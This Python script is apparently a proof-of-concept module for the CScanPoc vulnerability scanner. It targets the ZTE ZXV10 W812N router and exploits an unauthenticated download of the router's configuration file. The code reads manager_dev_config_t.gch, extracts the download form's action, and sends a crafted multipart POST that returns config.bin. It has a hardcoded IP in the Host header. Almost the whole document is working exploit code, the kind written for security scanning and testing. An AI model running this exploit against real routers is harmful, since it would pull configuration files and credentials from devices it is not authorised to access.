# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'ZTE_0002'  # 平台漏洞编号，留空
    name = 'ZXV10 W812N路由设置文件未授权访问下载'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
    disclosure_date = '2014-07-01'  # 漏洞公布时间
    desc = '''
        中兴ZXV10 W812N路由设置文件未授权访问下载：manager_dev_config_t.gch
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=066735'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'ZTE-Router'  # 漏洞应用名称
    product_version = '中兴ZXV10 W812N'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '33b36550-4e3e-41d8-bf5b-d6e6a9597a22'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer:http://www.wooyun.org/bugs/wooyun-2014-066735
            hh = hackhttp.hackhttp()
            arg = self.target
            target1 = arg + '/manager_dev_config_t.gch'
            code1, head1, res1, errcode, _ = hh.http(target1)
            action = re.findall(
                r'<form name="fDownload" method="POST" action="(.+?)"', res1)
            if action:
                if len(action) > 0:
                    raw = '''
POST /%s HTTP/1.1
Host: 221.201.251.110
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Type: multipart/form-data; boundary=---------------------------2354184430652
Content-Length: 141

-----------------------------2354184430652
Content-Disposition: form-data; name="defcfg"


-----------------------------2354184430652--
                    ''' % action
                    target2 = arg + action
                    code2, head2, res2, errcode2, _ = hh.http(target2, raw=raw)
                    if code2 == 200 and 'filename=config.bin' in head2:
                        #security_hole('ZTE config_file download '+target2)
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
